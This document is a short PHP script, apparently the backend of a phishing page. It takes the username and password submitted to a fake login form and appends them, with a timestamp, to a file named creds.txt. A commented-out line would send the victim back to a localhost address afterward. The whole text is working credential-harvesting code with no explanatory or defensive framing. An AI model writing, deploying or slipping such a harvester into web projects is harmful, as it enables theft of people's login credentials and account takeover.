<?php
  $log = "creds.txt";
  $date = date("Y-m-d h:i:s A");
  $username = $_POST["username"];
  $password = $_POST["password"];
  $file = fopen("$log", "a+");
  fputs($file, "$date | USERNAME: $username | PASSWORD: $password\n");
  // header( 'Location: http://localhost:1234/?q=test'); redirect the user back 
?>